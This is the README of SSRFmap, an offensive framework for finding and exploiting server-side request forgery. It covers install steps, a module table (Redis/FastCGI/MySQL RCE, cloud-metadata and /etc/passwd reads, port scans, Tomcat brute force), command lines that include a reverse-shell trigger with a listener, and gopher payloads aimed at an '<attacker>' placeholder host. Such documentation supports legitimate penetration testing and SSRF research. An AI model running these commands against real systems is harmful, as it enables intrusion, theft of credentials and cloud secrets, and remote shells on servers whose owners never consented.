# SSRFmap [![CI](https://github.com/swisskyrepo/SSRFmap/actions/workflows/ci.yml/badge.svg)](https://github.com/swisskyrepo/SSRFmap/actions/workflows/ci.yml) [![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/) [![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.raw.pm/)


SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. SSRFmap takes a Burp request file as input and a parameter to fuzz.

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Summary

* [Install and Manual](#install-and-manual)
* [Modules](#modules)
* [Examples](#examples)
* [SSRFmap - Tests](#ssrfmap-tests)
* [Contribute](#contribute)
  * [Roadmap](#roadmap)
  * [Contributors](#thanks-to-the-contributors)


## Install and Manual

### Github

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
uv sync --frozen
uv run python ssrfmap.py --help

  usage: ssrfmap.py [-h] -r REQFILE -p PARAM [-m MODULES] [-l [HANDLER]] [-v]
                    [--lhost LHOST] [--lport LPORT] [--ldomain LDOMAIN]
                    [--rfiles [TARGETFILES]] [--uagent USERAGENT] [--ssl [SSL]]
                    [--proxy PROXY] [--level [LEVEL]] [--logfile LOGFILE]

  options:
    -h, --help          show this help message and exit
    -r REQFILE          SSRF Request file
    -p PARAM            SSRF Parameter to target
    -m MODULES          SSRF Modules to enable
    -l [HANDLER]        Start an handler for a reverse shell
    -v                  Enable verbosity
    --lhost LHOST       LHOST reverse shell or IP to target in the network
    --lport LPORT       LPORT reverse shell or port to target in the network
    --ldomain LDOMAIN   Domain to target for AXFR query or domain related modules
    --rfiles [TARGETFILES]
                        Files to read with readfiles module
    --uagent USERAGENT  User Agent to use
    --ssl [SSL]         Use HTTPS without verification
    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
    --level [LEVEL]     Level of test to perform (1-5, default: 1)
    --logfile LOGFILE   SSRFmap Log file
```

### Docker

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
docker build -t ssrfmap .
docker run --rm ssrfmap ssrfmap.py --help

# Mount only the request files needed at runtime.
docker run --rm -it \
  -v "$(pwd)/examples:/requests:ro" \
  ssrfmap ssrfmap.py -r /requests/request.txt -p url -m readfiles
```

## Modules

The following modules are already implemented and can be used with the `-m` argument.

| Name           | Description                                              |
| :------------- | :------------------------------------------------------- |
| `axfr`         | DNS zone transfers (AXFR)                                |
| `fastcgi`      | FastCGI RCE                                              |
| `redis`        | Redis RCE                                                |
| `github`       | Github Enterprise RCE < 2.8.7                            |
| `zabbix`       | Zabbix RCE                                               |
| `mysql`        | MySQL Command execution                                  |
| `postgres`     | Postgres Command execution                               |
| `docker`       | Docker Infoleaks via API                                 |
| `smtp`         | SMTP send mail                                           |
| `portscan`     | Scan top 8000 ports for the host                         |
| `networkscan`  | HTTP Ping sweep over the network                         |
| `readfiles`    | Read files such as `/etc/passwd`                         |
| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
| `socksproxy`   | SOCKS4 Proxy                                             |
| `smbhash`      | Force an SMB authentication via a UNC Path               |
| `tomcat`       | Bruteforce attack against Tomcat Manager                 |
| `custom`       | Send custom data to a listening service, e.g: netcat     |
| `memcache`     | Store data inside the memcache instance                  |


## Examples

First you need a request with a parameter to fuzz, Burp requests works well with SSRFmap. 
They should look like the following. More examples are available in the **./examples** folder.

```powershell
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1

url=https%3A%2F%2Fwww.google.fr
```

Use the `-m` followed by module name (separated by a `,` if you want to launch several modules).

```bash
# Launch a portscan on localhost and read default files
uv run python ssrfmap.py -r examples/request.txt -p url -m readfiles,portscan
```

If you want to inject inside a header, or a GET, POST, or PUT parameter, specify its name:

```bash
uv run python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /tmp/test
```

By default, SSRFmap replaces the selected parameter's complete value. To keep part of the saved
value, place `*FUZZ*` exactly where the payload should be inserted:

```text
url=test;*FUZZ*;end
```

Using `-p url` preserves `test;` and `;end`, replacing only `*FUZZ*` with each payload. The
marker works in GET parameters, headers, POST or PUT bodies, JSON, XML, and multipart form fields.

If you need to have a custom user-agent use the `--uagent`. Some targets will use HTTPS, you can enable it with `--ssl`.

```bash
# Launch a portscan against an HTTPS endpoint using a custom user-agent
uv run python ssrfmap.py -r examples/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
```

Some modules allow you to create a connect back, you have to specify `LHOST` and `LPORT`. Also SSRFmap can listen for the incoming reverse shell.

```bash
# Triggering a reverse shell on a Redis
uv run python ssrfmap.py -r examples/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l create a listener for reverse shell on the specified port
# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
```

When the target is protected by a WAF or some filters you can try a wide range of payloads and encoding with the parameter `--level`.

```text
--level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
```

## SSRFmap Tests

Run the automated unit tests and lint checks with:

```bash
uv run pytest
uv run ruff check .
uv run ruff format --check .
```

A quick way to test the framework can be done with `data/example.py` SSRF service.

### Local

```bash
# run example ssrf http service
uv run flask --app examples/example.py run &

# run ssrfmap tool
uv run python ssrfmap.py -r examples/request.txt -p url -m readfiles

# reproduce SSRF when the URL is inside a multipart/form-data body
uv run python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /etc/issue

# reproduce a PUT SSRF while preserving the value prefix before *FUZZ*
uv run python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue

# reproduce SSRF with a JSON body sent via PUT; the injection parameter is url
uv run python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue

# preserve value while replacing only *FUZZ* in the POST value
uv run python ssrfmap.py -r examples/request10.txt -p url -m readfiles --rfiles /etc/issue
```

Retrieved files and cloud metadata are saved under `loot/<target>/`. The `loot/` directory is
ignored by Git and must not be committed.

### Docker

```bash
docker build -t ssrfmap .
mkdir -p loot

# Run the example SSRF HTTP service in a named background container.
docker run --name example --rm -d -p 5000:5000 \
  -v "$(pwd)/loot:/usr/src/app/loot" \
  ssrfmap examples/example.py

# Run SSRFmap's tests in the same container and uv environment.
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m readfiles
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request2.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request3.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request4.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request5.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request7.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request8.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request9.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request10.txt -p url -m readfiles --rfiles /etc/issue
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request.txt -p url -m axfr
docker exec -it example uv run --no-sync python ssrfmap.py -r examples/request3.txt -p url -m axfr --lhost 127.0.0.1 --lport 53 --ldomain example.lab

# Stop and remove the example container when finished.
docker stop example
```


## Contribute

I :heart: pull requests :)

### Roadmap

Feel free to add any feature listed below or a new service:

- Redis PHP Exploitation
- HTTP module (Jenkins ?)

  ```text
  gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
  gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
  ```

You can also contribute with a beer IRL or via Github Sponsor button.

### Thanks to the contributors

<p align="center">
<a href="https://github.com/swisskyrepo/SSRFmap/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=swisskyrepo/SSRFmap&max=36">
</a>
</p>


## Inspired by

- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [SSRF testing - cujanovic](https://github.com/cujanovic/SSRF-Testing)
